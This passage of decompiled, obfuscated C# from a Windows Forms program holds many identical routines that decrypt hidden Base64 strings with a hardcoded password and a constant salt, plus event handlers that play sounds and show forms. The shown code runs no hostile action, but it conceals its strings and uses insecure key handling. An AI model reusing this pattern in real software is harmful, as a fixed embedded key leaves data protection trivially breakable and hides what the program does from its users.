		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private object method_10(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void xaMooqfcfY(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.startup, (AudioPlayMode)1);
	}

	private object method_11(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void method_12(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_17(), (AudioPlayMode)1);
	}

	private void method_13(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_16(), (AudioPlayMode)1);
	}

	private void rkgoYvffSA(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_20(), (AudioPlayMode)1);
	}

	private object method_14(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void method_15(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_14(), (AudioPlayMode)1);
	}

	private object method_16(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private object method_17(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private object method_18(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void Panel3_MouseHover(object sender, EventArgs e)
	{
		((Computer)Class2.Class1_0).get_Audio().Play((Stream)Class12.smethod_12(), (AudioPlayMode)1);
	}

	private object method_19(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	private void Label9_MouseHover(object sender, EventArgs e)
	{
		((Control)Class2.Class3_0.Form5).Show();
	}

	private object method_20(string string_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("cIcIROdRUROhWMHfuvcPYGJ", salt);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		MemoryStream memoryStream = new MemoryStream();
		CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
		object @string = default(object);
		try
		{
			byte[] array = Convert.FromBase64String(string_0);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			@string = Encoding.UTF8.GetString(memoryStream.ToArray());
			return @string;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return @string;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void BlackShadesNetTopButton1_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}
}
